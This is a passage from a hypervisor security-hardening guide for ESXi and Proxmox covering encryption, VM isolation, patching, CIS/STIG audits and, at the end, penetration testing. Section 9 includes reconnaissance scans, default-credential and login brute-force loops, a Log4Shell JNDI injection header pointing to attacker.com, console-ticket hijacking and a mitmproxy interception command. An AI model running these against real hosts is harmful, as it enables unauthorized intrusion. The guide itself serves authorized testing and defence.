$pvlanConfig += New-Object VMware.Vim.VMwareDVSPvlanMapEntry -Property @{
    PrimaryVlanId = 100; SecondaryVlanId = 102; PvlanType = "community"
}

# Isolated: VMs cannot communicate with each other
# Community: VMs in same community can communicate
# Promiscuous: Can communicate with all (gateway)
```

---

## 5. Storage Security

### 5.1 VMDK/qcow2 Encryption at Rest

**ESXi VM Encryption:**

```powershell
# Prerequisites: Key Management Server (KMS) configured in vCenter
# Add KMS cluster
Add-KeyProvider -Name "HashiCorpVault" -KmsServerName "vault.corp.local" `
  -KmsServerAddress "vault.corp.local" -KmsServerPort 5696

# Encrypt existing VM (storage vMotion to encrypted datastore)
$vm = Get-VM "sensitive-db"
$spec = New-Object VMware.Vim.VirtualMachineConfigSpec
$spec.Crypto = New-Object VMware.Vim.CryptoSpecEncrypt
$spec.Crypto.CryptoKeyId = New-Object VMware.Vim.CryptoKeyId
$spec.Crypto.CryptoKeyId.KeyId = "auto-generate"
($vm | Get-View).ReconfigVM($spec)

# Verify encryption status
Get-VM "sensitive-db" | Select-Object Name,
    @{N='Encrypted';E={$_.ExtensionData.Config.KeyId -ne $null}}
```

**Proxmox qcow2 encryption (LUKS layer):**

```bash
# Create encrypted disk for VM
qemu-img create -f qcow2 -o encrypt.format=luks,encrypt.key-secret=sec0 \
  /var/lib/vz/images/100/vm-100-disk-0.qcow2 100G

# Alternatively, use Proxmox LUKS-on-LVM approach (preferred):
# The entire thin pool is LUKS-encrypted (Section 3.8)
# Individual VM disk encryption adds per-VM key management complexity
# Recommendation: whole-storage encryption + per-VM vTPM for guest-level encryption
```

### 5.2 iSCSI CHAP Authentication

```bash
# Proxmox: Configure mutual CHAP for iSCSI targets
pvesm add iscsi iscsi-san --portal 10.0.50.10 \
  --target iqn.2024-01.com.corp:storage.lun1

# Configure CHAP in /etc/iscsi/iscsid.conf
cat >> /etc/iscsi/iscsid.conf << 'EOF'
# Initiator (Proxmox) authenticates to target
node.session.auth.authmethod = CHAP
node.session.auth.username = pve-initiator
node.session.auth.password = <32-char-random-secret>

# Mutual CHAP: target also authenticates back to initiator
node.session.auth.username_in = san-target
node.session.auth.password_in = <32-char-random-secret>

# Discovery session CHAP
discovery.sendtargets.auth.authmethod = CHAP
discovery.sendtargets.auth.username = pve-discovery
discovery.sendtargets.auth.password = <32-char-random-secret>
EOF

systemctl restart iscsid
iscsiadm -m discovery -t sendtargets -p 10.0.50.10
iscsiadm -m node --login
```

**ESXi iSCSI CHAP:**

```powershell
# PowerCLI: Configure bidirectional CHAP
$vmhost = Get-VMHost "esxi01.corp.local"
$hba = $vmhost | Get-VMHostHba -Type IScsi
$hba | Set-VMHostHba `
    -ChapType Required `
    -ChapName "esxi-initiator" `
    -ChapPassword "S3cur3-CHAP-Passw0rd-32chars!!" `
    -MutualChapEnabled $true `
    -MutualChapName "san-target" `
    -MutualChapPassword "Mutual-CHAP-S3cret-32chars!!"
```

### 5.3 NFS Security with Kerberos

```bash
# Proxmox: Mount NFS with krb5p (encrypted + integrity)
pvesm add nfs nfs-secure --server nfs.corp.local \
  --export /export/vm-storage --path /mnt/pve/nfs-secure \
  --options "sec=krb5p,vers=4.2"

# Required: Kerberos keytab on Proxmox host
# /etc/krb5.keytab must contain host/pve01.corp.local@CORP.LOCAL principal

# NFS server (/etc/exports) must enforce:
# /export/vm-storage  10.0.50.0/24(rw,sync,no_subtree_check,sec=krb5p)

# Verify Kerberos ticket
klist -k /etc/krb5.keytab
kinit -k host/pve01.corp.local@CORP.LOCAL
```

### 5.4 Ceph Encryption

```bash
# Ceph OSD encryption (dm-crypt at OSD level)
# During OSD creation in Proxmox:
pveceph osd create /dev/sdc --encrypted 1

# This creates LUKS2-encrypted OSD with auto-unlock via dm-crypt
# Keys are stored in Ceph monitor keyring (ceph-volume)

# Verify encryption status
ceph osd metadata osd.0 | jq '.bluefs_db_type, .osd_objectstore'
lsblk --fs /dev/sdc
# Should show: crypt → lvm → osd

# Ceph in-transit encryption (messenger v2 protocol)
# /etc/ceph/ceph.conf
[global]
ms_cluster_mode = secure
ms_service_mode = secure
ms_client_mode = secure
ms_mon_cluster_mode = secure
ms_mon_service_mode = secure
ms_mon_client_mode = secure

# Verify encryption in flight
ceph config get osd.0 ms_cluster_mode
# Expected: secure
```

### 5.5 vSAN Encryption

```powershell
# vSAN Data-at-Rest Encryption (D@RE)
$cluster = Get-Cluster "vSAN-Cluster"
$vsanConfig = Get-VsanClusterConfiguration -Cluster $cluster

# Enable D@RE with KMS
Set-VsanClusterConfiguration -Configuration $vsanConfig `
    -EncryptionEnabled $true `
    -KmsCluster "HashiCorpVault" `
    -EraseDisksBeforeUse $true

# vSAN Data-in-Transit Encryption
Set-VsanClusterConfiguration -Configuration $vsanConfig `
    -DataInTransitEncryptionEnabled $true

# Verify encryption status
Get-VsanClusterConfiguration -Cluster $cluster |
    Select EncryptionEnabled, DataInTransitEncryptionEnabled, KmsCluster

# Rekey operation (rotate encryption keys)
Set-VsanClusterConfiguration -Configuration $vsanConfig `
    -EncryptionEnabled $true `
    -ReKey $true `
    -ShallowRekey $true  # Shallow = KEK rotation only (fast)
                         # Deep = DEK rotation (rewrite all data, slow)
```

### 5.6 Secure Erasure Procedures

```bash
# Proxmox: Secure disk wipe before decommissioning
# For SSD (TRIM/discard based):
blkdiscard --secure /dev/sdb

# For HDD (cryptographic erase via LUKS):
# Method: destroy LUKS header → data is unrecoverable
cryptsetup erase /dev/sdb1
dd if=/dev/urandom of=/dev/sdb1 bs=1M count=10  # Overwrite LUKS header area

# For Ceph OSD removal with secure erase:
ceph osd out osd.5
ceph osd crush remove osd.5
systemctl stop ceph-osd@5
ceph auth del osd.5
ceph osd rm osd.5
# Now wipe the underlying disk
cryptsetup erase /dev/disk/by-id/<osd-disk>
dd if=/dev/zero of=/dev/disk/by-id/<osd-disk> bs=1M status=progress

# ESXi: Secure erase datastore
# Use vSAN secure erase policy or:
esxcli storage core device setconfig -d <device-naa-id> --secure-erase-supported=true
```

---

## 6. VM Security Configuration

### 6.1 Virtual TPM 2.0

**ESXi vTPM:**

```powershell
# Add vTPM to VM (requires VM encryption or Native Key Provider)
$vm = Get-VM "windows-2022-secured"
$spec = New-Object VMware.Vim.VirtualMachineConfigSpec

# Add vTPM device
$vtpm = New-Object VMware.Vim.VirtualDeviceConfigSpec
$vtpm.Operation = "add"
$vtpm.Device = New-Object VMware.Vim.VirtualTPM
$spec.DeviceChange += $vtpm

($vm | Get-View).ReconfigVM($spec)

# Verify vTPM presence
(Get-VM "windows-2022-secured").ExtensionData.Config.Hardware.Device |
    Where-Object { $_ -is [VMware.Vim.VirtualTPM] }
```

**Proxmox vTPM (swtpm):**

```bash
# Install swtpm on Proxmox host (included in pve-qemu-kvm)
apt list --installed | grep swtpm

# Add TPM to VM 100 (via config file)
# /etc/pve/qemu-server/100.conf
# tpmstate0: local-lvm:vm-100-disk-1,size=4M,version=v2.0

# Via API:
pvesh create /nodes/pve01/qemu/100/config --tpmstate0 "local-lvm:4,version=v2.0"

# Verify TPM in guest:
# Windows: tpm.msc → TPM 2.0 present
# Linux: ls /dev/tpm0 && cat /sys/class/tpm/tpm0/tpm_version_major
```

### 6.2 Virtualization Based Security (VBS) for Windows Guests

VBS uses hardware virtualization to create an isolated memory region (Virtual Secure Mode) protecting credentials, kernel integrity, and code integrity:

```powershell
# ESXi VM requirements for VBS:
# - vHardware 14+
# - EFI firmware with Secure Boot
# - vTPM 2.0
# - Nested virtualization NOT required (hypervisor exposes VBS directly)

# PowerCLI: Configure VM for VBS
$vm = Get-VM "windows-2022-vbs"
$spec = New-Object VMware.Vim.VirtualMachineConfigSpec
$spec.Firmware = "efi"
$spec.BootOptions = New-Object VMware.Vim.VirtualMachineBootOptions
$spec.BootOptions.EfiSecureBootEnabled = $true
$spec.NestedHVEnabled = $false
$spec.VBSEnabled = $true
$spec.ExtraConfig += New-Object VMware.Vim.OptionValue -Property @{
    Key = "vvtd.enable"; Value = "TRUE"
}
($vm | Get-View).ReconfigVM($spec)
```

**Proxmox VBS equivalent (CPU flags for Windows guests):**

```bash
# /etc/pve/qemu-server/100.conf
cpu: host,flags=+hv-evmcs;+hv-tlbflush;+hv-vapic;+hv-spinlocks=0x1fff
machine: pc-q35-8.1
bios: ovmf
efidisk0: local-lvm:vm-100-disk-0,efitype=4m,pre-enrolled-keys=1,size=528K
tpmstate0: local-lvm:vm-100-disk-1,size=4M,version=v2.0

# Guest-side: Enable VBS via Group Policy or registry
# HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard
# EnableVirtualizationBasedSecurity = 1
# RequirePlatformSecurityFeatures = 3 (Secure Boot + DMA Protection)
```

### 6.3 IOMMU/SR-IOV Security Implications

**IOMMU (VT-d/AMD-Vi) as security boundary:**

```bash
# Verify IOMMU is enabled (CRITICAL for device isolation)
dmesg | grep -i iommu
# Expected: "DMAR: IOMMU enabled" or "AMD-Vi: Initialized"

# Check IOMMU groups (devices in same group share DMA access)
find /sys/kernel/iommu_groups/ -type l | sort -V

# Security risk: PCI passthrough with devices in same IOMMU group
# A passed-through device can DMA to other devices in its group
# Mitigation: ACS (Access Control Services) override (kernel parameter)
# GRUB: intel_iommu=on iommu=pt pcie_acs_override=downstream,multifunction

# SR-IOV security: Virtual Functions share Physical Function firmware
# Risk: VF firmware bug → affects all VFs on same PF
# Mitigation: Keep PF firmware updated, limit VF count, isolate IOMMU groups
```

**Security checklist for PCI passthrough:**

```bash
# 1. Verify IOMMU group isolation
ls /sys/kernel/iommu_groups/<group-id>/devices/
# If multiple devices in group, only pass through if all go to same VM

# 2. Verify ACS support on PCIe bridge
lspci -vvv -s <bridge-bdf> | grep -i acs
# "ACSCtl: SrcValid+ TransBlk+ ReqRedir+ CmpltRedir+"

# 3. Proxmox VM config for passthrough
# hostpci0: 0000:41:00.0,pcie=1,rombar=0
# rombar=0 disables option ROM execution (attack surface reduction)
```

### 6.4 USB Passthrough Risks

```bash
# USB passthrough creates a direct DMA path from USB device to VM
# Risks:
# 1. BadUSB: Malicious USB device can emulate keyboard/network adapter
# 2. DMA attacks: USB4/Thunderbolt have direct memory access
# 3. Host attack: USB device bugs in host USB stack before passthrough

# Mitigation on Proxmox:
# Use USB device passthrough (vendorid:productid) NOT USB port passthrough
# USB port passthrough passes the entire controller (IOMMU group risk)

# VM config (device-level, safer):
# usb0: host=1234:5678
# NOT: usb0: host=1-2 (port-level, passes entire controller)

# Additional: disable USB completely for VMs that don't need it
# In /etc/pve/qemu-server/100.conf:
# machine: pc-q35-8.1
# Do NOT add any usb0/usb1 lines — no USB controller emulated

# ESXi: Disable USB passthrough arbitration
esxcli hardware usb passthrough device disable -d <device-path>
```

### 6.5 Clipboard and Drag-Drop Attack Vectors

```powershell
# ESXi: Disable clipboard and drag-drop (VM isolation)
$vm = Get-VM "isolated-workload"
$spec = New-Object VMware.Vim.VirtualMachineConfigSpec
$spec.ExtraConfig += @(
    (New-Object VMware.Vim.OptionValue -Property @{
        Key = "isolation.tools.copy.disable"; Value = "TRUE"
    }),
    (New-Object VMware.Vim.OptionValue -Property @{
        Key = "isolation.tools.paste.disable"; Value = "TRUE"
    }),
    (New-Object VMware.Vim.OptionValue -Property @{
        Key = "isolation.tools.dnd.disable"; Value = "TRUE"
    }),
    (New-Object VMware.Vim.OptionValue -Property @{
        Key = "isolation.tools.setGUIOptions.enable"; Value = "FALSE"
    }),
    (New-Object VMware.Vim.OptionValue -Property @{
        Key = "isolation.tools.diskShrink.disable"; Value = "TRUE"
    }),
    (New-Object VMware.Vim.OptionValue -Property @{
        Key = "isolation.tools.diskWiper.disable"; Value = "TRUE"
    })
)
($vm | Get-View).ReconfigVM($spec)
```

```bash
# Proxmox: SPICE clipboard isolation
# In VM SPICE config, disable clipboard sharing:
# /etc/pve/qemu-server/100.conf
# spice_enhancements: foldersharing=0,videostreaming=off
# args: -spice disable-copy-paste=on

# For VNC (noVNC): clipboard is browser-mediated, less risk
# but disable guest agent clipboard if present:
# In guest (Linux):
systemctl stop qemu-guest-agent
# Or configure: /etc/sysconfig/qemu-ga → BLACKLIST_RPC=guest-set-clipboard
```

### 6.6 VM Escape Mitigations

**Memory isolation hardening:**

```bash
# Proxmox: Disable memory balloon (prevents guest from probing host memory patterns)
# /etc/pve/qemu-server/100.conf
balloon: 0

# Disable KSM (Kernel Samepage Merging) — prevents cross-VM memory deduplication attacks
echo 0 > /sys/kernel/mm/ksm/run
# Persistent: add to /etc/sysctl.d/99-security.conf
echo "vm.ksm.run=0" >> /etc/sysctl.d/99-security.conf

# ESXi equivalent: Disable Transparent Page Sharing (TPS) inter-VM
esxcli system settings advanced set -o /Mem/ShareForceSalting -i 2
# Value 2 = salt per-VM (effectively disables inter-VM TPS)
```

**Interrupt and device isolation:**

```bash
# Ensure posted interrupts are used (prevents interrupt injection attacks)
# Proxmox QEMU args for hardened VM:
args: -machine kernel-irqchip=split -cpu host,+invtsc,+spec-ctrl,+ssbd,+md-clear

# Disable virtio-balloon, virtio-rng shared with host (if not needed)
# Minimal device set for high-security VMs:
# Only: virtio-scsi (disk), virtio-net (NIC), vga=none (serial console only)
```

---

## 7. Patch Management for Hypervisors

### 7.1 ESXi Lifecycle Manager

```powershell
# vSphere Lifecycle Manager (vLCM) — image-based management
# Check current image compliance
$cluster = Get-Cluster "Production"
$compliance = Test-Compliance -Entity $cluster
$compliance | Where-Object Status -eq "NonCompliant" |
    Select Entity, Status, BaselineCompliance

# Create baseline from latest depot
$depot = Add-DepotUrl -Url "https://vmware.depot/vsphere/esxi/8.0/"
$baseline = New-Baseline -Name "ESXi-8.0U3-Security-$(Get-Date -Format yyyyMMdd)" `
    -Type Patch -IncludedPatch (Get-Patch -After (Get-Date).AddDays(-30) `
    -Severity Critical,Important)

# Attach and remediate (with pre-check)
Attach-Baseline -Entity $cluster -Baseline $baseline
Test-Compliance -Entity $cluster -UpdateType HostPatch

# Remediate cluster with rolling upgrade (requires DRS + HA)
Remediate-Inventory -Entity $cluster -Baseline $baseline `
    -ClusterDisableHighAvailability $false `
    -ClusterDisableDistributedResourceScheduler $false `
    -HostFailureAction Retry `
    -HostEvacuateVMs $true
```

### 7.2 Proxmox apt Repositories and Enterprise Subscription

```bash
# Enterprise repository (requires subscription — recommended for production)
# /etc/apt/sources.list.d/pve-enterprise.list
deb https://enterprise.proxmox.com/debian/pve bookworm pve-enterprise

# No-subscription repository (testing, lab environments)
# /etc/apt/sources.list.d/pve-no-subscription.list
# deb http://download.proxmox.com/debian/pve bookworm pve-no-subscription

# Security-only updates (Debian security)
# /etc/apt/sources.list
deb http://security.debian.org/debian-security bookworm-security main contrib

# Update procedure
apt update
apt list --upgradable | grep -E "pve|proxmox|qemu|ceph|zfs"

# Dry-run upgrade
apt-get -s dist-upgrade

# Apply updates (schedule maintenance window)
apt dist-upgrade -y

# Verify kernel and QEMU versions after update
pveversion -v
uname -r
qemu-system-x86_64 --version
```

### 7.3 Zero-Downtime Patching with HA/DRS

```bash
# Proxmox: Rolling update across cluster
# Step 1: Put node in maintenance mode (migrate VMs away)
# For each node in the cluster:
NODE="pve01"

# Migrate all VMs to other cluster members
for VMID in $(pvesh get /nodes/$NODE/qemu --output-format json | jq -r '.[].vmid'); do
  TARGETNODE=$(pvesh get /cluster/resources --type vm --output-format json | \
    jq -r ".[] | select(.vmid != $VMID) | .node" | head -1)
  pvesh create /nodes/$NODE/qemu/$VMID/migrate --target $TARGETNODE --online 1
done

# Step 2: Apply updates
ssh $NODE "apt update && apt dist-upgrade -y"

# Step 3: Reboot if kernel update
ssh $NODE "needs-restarting -r && reboot || echo 'No reboot needed'"

# Step 4: Verify node health
ssh $NODE "pvecm status && systemctl status pve-cluster pvedaemon pveproxy"

# Step 5: Migrate VMs back (optional, or let HA rebalance)
```

```powershell
# ESXi: DRS-assisted rolling update (automated via vLCM)
# Manual equivalent:
$cluster = Get-Cluster "Production"
$vmhosts = $cluster | Get-VMHost | Sort-Object Name

foreach ($vmhost in $vmhosts) {
    # Enter maintenance mode (DRS auto-migrates VMs)
    Set-VMHost -VMHost $vmhost -State Maintenance -Evacuate:$true

    # Wait for evacuation
    while ((Get-VMHost $vmhost).ConnectionState -ne "Maintenance") {
        Start-Sleep -Seconds 30
    }

    # Apply patch (via vLCM or manual)
    Remediate-Inventory -Entity $vmhost -Baseline $baseline

    # Exit maintenance
    Set-VMHost -VMHost $vmhost -State Connected

    # Wait for host to stabilize
    Start-Sleep -Seconds 120
    $health = (Get-VMHost $vmhost | Get-View).Runtime.HealthSystemRuntime
    Write-Host "$($vmhost.Name): Health = $($health.SystemHealthInfo.NumericSensorInfo[0].CurrentReading)"
}
```

### 7.4 Emergency Patching Procedures

```bash
# Proxmox: Emergency patch (critical CVE, cannot wait for maintenance window)
# Decision tree:
# 1. Is the vulnerable service externally reachable? → Patch NOW
# 2. Can the service be disabled as interim mitigation? → Disable, schedule patch
# 3. Is HA configured? → Rolling patch possible without downtime

# Example: Disable vulnerable service immediately (like ESXi SLP scenario)
# If a qemu CVE is announced but patch not available:
# Interim: restrict VM types that trigger the bug, or add firewall rule

# Emergency kernel live-patch (if available)
apt install linux-image-$(uname -r | sed 's/-.*//') -t bookworm-security
# If live-patchable: no reboot needed
# If not: schedule 5-minute emergency reboot window

# ESXi: Emergency patch without vLCM
esxcli software vib install -v /tmp/patch-bundle.zip --no-sig-check
# WARNING: --no-sig-check only in verified emergency; confirms supply chain trust
# Better: use --depot and signature validation
esxcli software profile update --depot=/vmfs/volumes/datastore1/patches/ESXi800-202401001.zip \
  --profile=ESXi-8.0U3a-standard
```

### 7.5 Rollback Strategies

```bash
# Proxmox: Rollback kernel update
# Boot into previous kernel via GRUB menu
# Or set default:
grep -E "^menuentry" /boot/grub/grub.cfg | head -5
grub-set-default 2  # Select previous kernel entry
update-grub

# Proxmox: Rollback package update
apt list --installed 2>/dev/null | grep pve-manager
# Check apt history:
cat /var/log/apt/history.log | tail -50
# Downgrade specific package:
apt install pve-manager=8.1.3 pve-kernel-6.5.11-7-pve

# ESXi: Rollback to previous image
# During boot, select "Shift+R" for recovery
# Or via CLI:
esxcli software profile get  # Current profile
# Boot into alt boot bank:
/altbootbank/boot.cfg  # ESXi maintains two boot banks
esxcli system boot device set --device=<alt-partition>
```

---

## 8. Audit and Compliance

### 8.1 CIS Benchmark for ESXi 7.x/8.x

Key CIS controls (condensed — full benchmark has 200+ checks):

| CIS ID | Control | Command to Verify |
|--------|---------|-------------------|
| 1.1 | Verify Secure Boot | `/usr/lib/vmware/secureboot/bin/secureBoot.py -s` |
| 2.1 | NTP configured | `esxcli system ntp get` |
| 2.2 | SLP disabled | `chkconfig slpd --list` → off |
| 3.1 | Lockdown mode enabled | `vim-cmd hostsvc/hostsystem_get | grep lockdownMode` |
| 4.1 | Password complexity | `/etc/pam.d/passwd` check |
| 5.1 | SSH disabled | `chkconfig SSH --list` → off |
| 5.4 | SSH timeout configured | `esxcli system settings advanced list -o /UserVars/ESXiShellTimeOut` |
| 6.1 | Bidirectional CHAP | via PowerCLI storage adapter check |
| 7.1 | Promiscuous mode rejected | `esxcli network vswitch standard policy security get` |
| 7.2 | MAC changes rejected | same command, MacChanges field |
| 7.3 | Forged transmits rejected | same command, ForgedTransmits field |
| 8.1 | VM logging limited | `isolation.tools.log.disable = TRUE` |
| 8.2 | Copy/paste disabled | `isolation.tools.copy.disable = TRUE` |

### 8.2 DISA STIG for VMware

STIG findings mapped to automated checks:

```powershell
# PowerCLI: Automated STIG compliance check
# STIG V-256379: ESXi must disable SSH
function Test-STIG-V256379 {
    param([string]$VMHost)
    $ssh = Get-VMHostService -VMHost $VMHost | Where-Object { $_.Key -eq "TSM-SSH" }
    if ($ssh.Running -or $ssh.Policy -ne "off") {
        return @{ Finding = "OPEN"; Detail = "SSH running or policy not 'off'" }
    }
    return @{ Finding = "NotAFinding"; Detail = "SSH disabled" }
}

# STIG V-256380: ESXi must disable DCUI
function Test-STIG-V256380 {
    param([string]$VMHost)
    $dcui = Get-VMHostService -VMHost $VMHost | Where-Object { $_.Key -eq "DCUI" }
    if ($dcui.Running) {
        return @{ Finding = "OPEN"; Detail = "DCUI service running" }
    }
    return @{ Finding = "NotAFinding"; Detail = "DCUI stopped" }
}

# STIG V-256449: ESXi must enforce TLS 1.2 minimum
function Test-STIG-V256449 {
    param([string]$VMHost)
    $esxcli = Get-EsxCli -VMHost $VMHost -V2
    $config = $esxcli.system.security.fips140.ssh.get.Invoke()
    # Check /etc/vmware/rhttpproxy/config.xml for TLS settings
    return @{
        Finding = "Manual"
        Detail = "Verify sslContext protocol=TLSv1.2 in rhttpproxy config"
    }
}

# Run STIG checks across cluster
$results = @()
Get-Cluster "Production" | Get-VMHost | ForEach-Object {
    $results += [PSCustomObject]@{
        Host = $_.Name
        V256379 = (Test-STIG-V256379 -VMHost $_).Finding
        V256380 = (Test-STIG-V256380 -VMHost $_).Finding
        V256449 = (Test-STIG-V256449 -VMHost $_).Finding
    }
}
$results | Format-Table -AutoSize
```

### 8.3 PowerCLI Compliance Automation

```powershell
# Comprehensive CIS ESXi 8.0 Benchmark Audit Script
# Outputs: JSON report with pass/fail per control

function Invoke-CISBenchmarkAudit {
    param(
        [Parameter(Mandatory)]
        [string]$ClusterName,
        [string]$OutputPath = "./cis-audit-$(Get-Date -Format yyyyMMdd-HHmm).json"
    )

    $cluster = Get-Cluster $ClusterName
    $vmhosts = $cluster | Get-VMHost
    $report = @()

    foreach ($vmhost in $vmhosts) {
        $esxcli = Get-EsxCli -VMHost $vmhost -V2
        $hostReport = @{
            HostName = $vmhost.Name
            Timestamp = (Get-Date -Format "o")
            Controls = @()
        }

        # CIS 1.1 - Secure Boot
        $secureBoot = $esxcli.system.settings.encryption.get.Invoke()
        $hostReport.Controls += @{
            ID = "CIS-1.1"; Title = "Secure Boot"
            Status = if ($secureBoot.Mode -eq "TPM") { "PASS" } else { "FAIL" }
            Evidence = $secureBoot.Mode
        }

        # CIS 2.2 - SLP Disabled
        $slp = $esxcli.network.firewall.ruleset.list.Invoke() |
            Where-Object { $_.Name -eq "CIMSLP" }
        $hostReport.Controls += @{
            ID = "CIS-2.2"; Title = "SLP Service Disabled"
            Status = if (-not $slp.Enabled) { "PASS" } else { "FAIL" }
            Evidence = "CIMSLP enabled: $($slp.Enabled)"
        }

        # CIS 5.1 - SSH Disabled
        $sshSvc = Get-VMHostService -VMHost $vmhost |
            Where-Object { $_.Key -eq "TSM-SSH" }
        $hostReport.Controls += @{
            ID = "CIS-5.1"; Title = "SSH Service Disabled"
            Status = if (-not $sshSvc.Running -and $sshSvc.Policy -eq "off") {
                "PASS" } else { "FAIL" }
            Evidence = "Running: $($sshSvc.Running), Policy: $($sshSvc.Policy)"
        }

        # CIS 7.1-7.3 - vSwitch Security
        $vswitches = $vmhost | Get-VirtualSwitch
        foreach ($vs in $vswitches) {
            $policy = $vs | Get-SecurityPolicy
            $hostReport.Controls += @{
                ID = "CIS-7.1"; Title = "Promiscuous Mode - $($vs.Name)"
                Status = if (-not $policy.AllowPromiscuous) { "PASS" } else { "FAIL" }
                Evidence = "AllowPromiscuous: $($policy.AllowPromiscuous)"
            }
            $hostReport.Controls += @{
                ID = "CIS-7.2"; Title = "MAC Changes - $($vs.Name)"
                Status = if (-not $policy.MacChanges) { "PASS" } else { "FAIL" }
                Evidence = "MacChanges: $($policy.MacChanges)"
            }
            $hostReport.Controls += @{
                ID = "CIS-7.3"; Title = "Forged Transmits - $($vs.Name)"
                Status = if (-not $policy.ForgedTransmits) { "PASS" } else { "FAIL" }
                Evidence = "ForgedTransmits: $($policy.ForgedTransmits)"
            }
        }

        $report += $hostReport
    }

    $report | ConvertTo-Json -Depth 5 | Out-File $OutputPath
    Write-Host "Audit complete: $OutputPath"
    Write-Host "Summary: $(($report.Controls | Where-Object Status -eq 'FAIL').Count) failures"
    return $report
}

# Execute audit
Invoke-CISBenchmarkAudit -ClusterName "Production"
```

### 8.4 Proxmox Audit Logging

```bash
# Proxmox logs all API operations to /var/log/pveproxy/access.log
# and system-level actions to journald

# Configure comprehensive audit logging
# /etc/pve/datacenter.cfg
cat >> /etc/pve/datacenter.cfg << 'EOF'
# Console and audit settings
console: html5
http_proxy: none
EOF

# Task log location
ls /var/log/pve/tasks/

# Enable detailed task logging
pvesh get /cluster/tasks --limit 50 --output-format json | \
  jq '.[] | {node, user, type: .type, status, starttime: (.starttime | todate)}'

# Monitor authentication events
journalctl -u pvedaemon --since "1 hour ago" | grep -E "auth|login|permission"

# Monitor API access
tail -f /var/log/pveproxy/access.log | grep -v "GET /api2/json/cluster/status"
```

### 8.5 Syslog Forwarding

```bash
# Proxmox: Forward all security events to SIEM
# /etc/rsyslog.d/50-remote-siem.conf
cat > /etc/rsyslog.d/50-remote-siem.conf << 'EOF'
# Forward auth and security events to SIEM (TLS)
$DefaultNetstreamDriverCAFile /etc/ssl/certs/siem-ca.pem
$DefaultNetstreamDriverCertFile /etc/ssl/certs/pve-syslog.pem
$DefaultNetstreamDriverKeyFile /etc/ssl/private/pve-syslog.key

$ActionSendStreamDriver gtls
$ActionSendStreamDriverMode 1
$ActionSendStreamDriverAuthMode x509/name

# Auth events
auth,authpriv.*  @@siem.corp.local:6514

# Kernel events (includes firewall drops)
kern.*  @@siem.corp.local:6514

# Proxmox specific
:programname, contains, "pvedaemon"  @@siem.corp.local:6514
:programname, contains, "pveproxy"  @@siem.corp.local:6514
:programname, contains, "pvestatd"  @@siem.corp.local:6514
:programname, contains, "pvescheduler"  @@siem.corp.local:6514
EOF

systemctl restart rsyslog

# ESXi: Configure syslog forwarding
esxcli system syslog config set --loghost="ssl://siem.corp.local:6514"
esxcli system syslog config set --default-rotate=20 --default-size=10240
esxcli system syslog reload
```

### 8.6 Compliance Framework Mapping

| Control Area | PCI-DSS 4.0 | HIPAA | SOC 2 | ESXi Feature | Proxmox Feature |
|---|---|---|---|---|---|
| Access Control | Req 7,8 | §164.312(a) | CC6.1 | Lockdown, RBAC | RBAC, 2FA, token scoping |
| Encryption at Rest | Req 3.5 | §164.312(a)(2)(iv) | CC6.1 | VM Encryption, vSAN | LUKS, Ceph encryption |
| Encryption in Transit | Req 4.1 | §164.312(e)(1) | CC6.7 | Encrypted vMotion | TLS pveproxy, Ceph msgr2 |
| Audit Logging | Req 10 | §164.312(b) | CC7.2 | vRealize Log | rsyslog, task logs |
| Patch Management | Req 6.3 | §164.308(a)(1) | CC7.1 | vLCM | apt, enterprise repo |
| Network Segmentation | Req 1.2 | §164.312(e)(1) | CC6.6 | NSX-T DFW, PVLAN | SDN, firewall tiers |
| Integrity Monitoring | Req 11.5 | §164.312(c)(1) | CC7.3 | Secure Boot, TPM | dm-verity, Secure Boot |
| Key Management | Req 3.6 | §164.312(a)(2)(iv) | CC6.1 | KMS, vTA | LUKS keyring, Vault |

---

## 9. Penetration Testing Hypervisors

### 9.1 Reconnaissance Techniques

```bash
# Network discovery of hypervisor management interfaces
# NEVER run without explicit written authorization

# Discover ESXi hosts (port 443, 902, 80)
nmap -sV -p 443,902,80,8006,8007,5900-5999,427 10.0.1.0/24 \
  --script=ssl-cert,vmware-version

# Identify Proxmox hosts (port 8006 with pveproxy banner)
nmap -sV -p 8006 10.0.1.0/24 --script=http-title

# SLP service discovery (CVE-2020-3992, CVE-2021-21974)
nmap -sU -p 427 10.0.1.0/24 --script=slp-discover

# vCenter identification
nmap -sV -p 443 vcenter.corp.local --script=vmware-version

# SNMP enumeration (if enabled)
snmpwalk -v2c -c public 10.0.1.20 1.3.6.1.4.1.6876  # VMware OID tree

# Certificate analysis (identify management plane)
echo | openssl s_client -connect 10.0.1.20:443 2>/dev/null | \
  openssl x509 -noout -subject -issuer -dates

# Banner grabbing pveproxy
curl -sk https://10.0.1.30:8006/api2/json/version | jq .
```

### 9.2 API Exploitation

```bash
# Proxmox API: Attempt authentication bypass / token discovery
# Test for default credentials (audit finding if successful)
curl -sk -d "username=root@pam&password=proxmox" \
  https://target:8006/api2/json/access/ticket

# Test API token disclosure in config backups
# Check if /etc/pve is world-readable (misconfiguration)

# ESXi MOB (Managed Object Browser) — often left enabled
curl -sk -u 'root:' https://esxi-host/mob/

# vCenter SAML token extraction (post-compromise)
# /storage/db/vmware-vmdir/data.mdb contains SAML signing cert
# If vCenter is compromised, all ESXi hosts trust its SAML tokens

# API rate limiting test
for i in $(seq 1 100); do
  curl -sk -o /dev/null -w "%{http_code}\n" \
    -d "username=admin@pam&password=wrong$i" \
    https://target:8006/api2/json/access/ticket
done | sort | uniq -c
# If no 429 responses: finding — no rate limiting on auth endpoint
```

### 9.3 Management Interface Attacks

```bash
# vCenter exploitation toolkit (post-auth or CVE-based)
# Log4Shell (CVE-2021-44228) affected vCenter 7.x — test via headers:
curl -sk -H 'X-Forwarded-For: ${jndi:ldap://attacker.com/x}' \
  https://vcenter/ui/

# Proxmox: Test for command injection in API parameters
# pveproxy API parameters are typically well-validated (Perl strict mode)
# but custom scripts / hooks may introduce injection points

# Test WebSocket hijacking (SPICE/VNC console)
# If console token is predictable or doesn't expire:
wscat -c "wss://target:8006/api2/json/nodes/pve01/qemu/100/vncwebsocket?port=5900&vncticket=<stolen>"

# Certificate validation bypass (MITM on management traffic)
# If management traffic crosses untrusted network without cert pinning
mitmproxy --mode transparent -p 8006 --ssl-insecure
```

### 9.4 Guest-to-Host Escape Methodology

```
PHASE 1: Information Gathering (from inside guest VM)
├── Identify hypervisor type: dmidecode, /sys/class/dmi/id/product_name
├── Identify virtual hardware: lspci, lsusb (attack surface enumeration)
├── Check for shared resources: shared folders, clipboard, USB
├── Identify paravirtual drivers: lsmod | grep -E "vmw|virtio|xen"
└── Check for guest agent: systemctl status qemu-guest-agent/vmtoolsd

PHASE 2: Attack Surface Mapping
